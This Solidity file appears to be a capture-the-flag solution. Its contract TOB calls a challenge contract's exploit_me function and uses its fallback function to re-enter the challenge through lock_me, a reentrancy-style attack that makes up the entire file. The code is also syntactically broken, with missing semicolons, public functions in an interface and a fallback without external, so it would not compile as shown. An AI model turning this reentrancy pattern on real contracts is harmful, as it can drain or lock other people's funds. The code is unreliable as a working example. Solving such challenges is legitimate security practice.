// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

interface IChallenge {
    function exploit_me(address winner) public
    function lock_me() public
}

contract TOB {
    address challengeContract;
    address winner;

    constructor(address _contract, address _winner){
        challengeContract = _contract;
        winner = _winner;
    }

    function exploit() public {
        IChallenge(challengeContract).exploit_me(winner)
    }

    fallback() payable {
        IChallenge(challengeContract).lock_me()
    }
}